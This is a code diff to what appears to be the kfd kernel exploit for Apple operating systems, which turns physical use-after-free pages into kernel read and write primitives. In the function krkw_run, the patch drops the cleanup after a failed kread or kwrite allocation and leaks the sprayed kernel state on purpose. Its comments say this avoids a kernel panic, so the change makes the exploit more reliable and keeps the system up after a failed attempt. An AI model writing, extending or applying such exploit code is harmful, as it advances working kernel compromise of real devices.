@@ -105,24 +105,24 @@ bool krkw_run(struct kfd* kfd)
 {
     if(krkw_helper_grab_free_pages(kfd) == false) return false;
 
-    //timer_start();
     if(krkw_helper_run_allocate(kfd, &kfd->kread) == false) {
-        krkw_helper_run_deallocate(kfd, &kfd->kread);
-        if (kfd->kread.krkw_method_ops.deallocate == kread_sem_open_deallocate) {
-            krkw_helper_run_deallocate(kfd, &kfd->kwrite);
-        }
+        // MISS: do NOT deallocate anything here. The puaf pages already
+        // overlap foreign mappings; tearing down sprayed semaphores /
+        // the copy region returns corrupted pages to the pager and takes
+        // the system down ("shared_region_pager_data_return" panic).
+        // Leave every mapping in place, keep the process alive, let the
+        // caller report failure. One-shot guard prevents a retry.
+        keKfdLogf("[ke] kfd: MISS on kread — leaking state, skipping deallocate\n");
         return false;
     }
     if(krkw_helper_run_allocate(kfd, &kfd->kwrite) == false) {
-        krkw_helper_run_deallocate(kfd, &kfd->kread);
-        krkw_helper_run_deallocate(kfd, &kfd->kwrite);
+        keKfdLogf("[ke] kfd: MISS on kwrite — leaking state, skipping deallocate\n");
         return false;
     }
     
     usleep(1000);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
-    //timer_end();
     return true;
 }
 
